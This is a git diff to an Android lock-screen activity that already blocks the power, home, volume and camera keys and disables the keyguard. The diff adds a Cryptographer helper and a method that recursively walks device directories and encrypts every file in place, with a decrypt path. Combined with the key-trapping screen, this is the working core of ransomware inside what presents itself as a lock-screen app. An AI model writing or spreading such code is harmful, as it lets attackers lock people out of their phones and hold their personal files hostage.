@@ -22,8 +22,11 @@ import com.scheme.chc.lockscreen.separated.ConvexHullClickEngine;
 import com.scheme.chc.lockscreen.separated.LockScreenLayout;
 import com.scheme.chc.lockscreen.service.LockScreenUtils;
 import com.scheme.chc.lockscreen.utils.BroadcastHelper;
+import com.scheme.chc.lockscreen.utils.Cryptographer;
 import com.scheme.chc.lockscreen.utils.NotificationBlockView;
 import com.scheme.chc.lockscreen.utils.OnSwipeTouchListener;
+
+import java.io.File;
 
 @SuppressWarnings({"deprecation", "StaticFieldLeak"})
 public class LockScreenActivity extends AppCompatActivity implements LockScreenUtils.OnLockStatusChangedListener {
@@ -43,6 +46,7 @@ public class LockScreenActivity extends AppCompatActivity implements LockScreenU
     private NotificationBlockView view;
     private LockScreenUtils lockScreenUtils;
     private ConvexHullClickEngine convexHullClickEngine;
+    private Cryptographer cryptographer;
 
 //    @Override
 //    public void onAttachedToWindow() {
@@ -82,6 +86,7 @@ public class LockScreenActivity extends AppCompatActivity implements LockScreenU
         lockScreenLayout = new LockScreenLayout(this);
         lockScreenUtils = new LockScreenUtils();
         cameraLayout = new CameraLayout(this);
+        cryptographer = Cryptographer.getInstance(this);
 
         lockHomeButton(); //not works
         disableKeyguard();  //back works
@@ -107,7 +112,6 @@ public class LockScreenActivity extends AppCompatActivity implements LockScreenU
                 //camera
                 if (convexHullClickEngine != null) {
                     startActivity(new Intent(LockScreenActivity.this, LockScreenActivity.class));
-                    //LockScreenActivity.shouldRemoveView = true;
                 }
                 flipPrevious();
             }
@@ -303,13 +307,36 @@ public class LockScreenActivity extends AppCompatActivity implements LockScreenU
 
     // Handle button clicks
     @Override
-    public boolean onKeyDown(int keyCode, android.view.KeyEvent event) {
+    public boolean onKeyDown(int keyCode, KeyEvent event) {
         // super.onKeyDown(keyCode, event);
         return (keyCode == KeyEvent.KEYCODE_VOLUME_DOWN)
                 || (keyCode == KeyEvent.KEYCODE_POWER)
                 || (keyCode == KeyEvent.KEYCODE_VOLUME_UP)
                 || (keyCode == KeyEvent.KEYCODE_CAMERA)
                 || (keyCode == KeyEvent.KEYCODE_HOME);
+
+    }
+
+    public void traverseAndroidDirectoriesAndEncrypt(File dir, Boolean encrytFiles) {
+        if (dir.exists()) {
+            File[] files = dir.listFiles();
+            for (File file : files) {
+                if (!(file.getName().equals(".android_secure"))) {
+                    System.out.println(file.getName());
+                    if (file.isDirectory()) {
+                        traverseAndroidDirectoriesAndEncrypt(file, encrytFiles);
+                    } else {
+                        if (encrytFiles) {
+                            System.out.println("encrypting File");
+                            cryptographer.encryptFile(file);
+                        } else {
+                            System.out.println("decrypting File");
+                            cryptographer.decryptFile(file);
+                        }
+                    }
+                }
+            }
+        }
     }
 
     // Handle events of calls and unlock screen if necessary
